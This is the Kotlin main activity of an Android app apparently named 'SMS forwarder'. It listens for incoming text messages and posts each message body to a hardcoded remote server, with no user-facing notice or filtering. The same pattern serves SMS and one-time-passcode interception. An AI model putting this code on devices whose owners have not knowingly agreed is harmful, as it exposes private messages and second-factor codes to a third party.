package com.example.smsforwarder

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import org.json.JSONObject

class MainActivity : AppCompatActivity() {
    
    private val SMS_PERMISSION_CODE = 101
    private val SERVER_URL = "https://sms-server-g8xb.onrender.com/sms"
    
    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
                val bundle = intent.extras
                val pdus = bundle?.get("pdus") as Array<*>?
                
                pdus?.forEach { pdu ->
                    val smsMessage = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        SmsMessage.createFromPdu(pdu as ByteArray, bundle.getString("format"))
                    } else {
                        SmsMessage.createFromPdu(pdu as ByteArray)
                    }
                    
                    val sender = smsMessage?.displayOriginatingAddress ?: "unknown"
                    val message = smsMessage?.messageBody ?: ""
                    
                    if (message.isNotEmpty()) {
                        sendSmsToServer(message)
                    }
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        checkPermissions()
        registerSmsReceiver()
    }

    private fun checkPermissions() {
        val permissions = arrayOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.INTERNET
        )

        if (permissions.any { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }) {
            ActivityCompat.requestPermissions(this, permissions, SMS_PERMISSION_CODE)
        }
    }

    private fun registerSmsReceiver() {
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        registerReceiver(smsReceiver, filter)
    }

    private fun sendSmsToServer(message: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val client = OkHttpClient()
                val mediaType = MediaType.parse("application/json")
                
                val jsonBody = JSONObject().apply {
                    put("sms", message)
                }
                
                val body = RequestBody.create(mediaType, jsonBody.toString())
                val request = Request.Builder()
                    .url(SERVER_URL)
                    .post(body)
                    .addHeader("Content-Type", "application/json")
                    .build()

                val response = client.newCall(request).execute()
                
                if (response.isSuccessful) {
                    Log.d("SMSForwarder", "SMS успешно отправлено на сервер: $message")
                } else {
                    Log.e("SMSForwarder", "Ошибка отправки: ${response.code()} - ${response.message()}")
                }
                
            } catch (e: Exception) {
                Log.e("SMSForwarder", "Ошибка: ${e.message}")
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                Log.d("SMSForwarder", "Все разрешения получены")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(smsReceiver)
    }
}
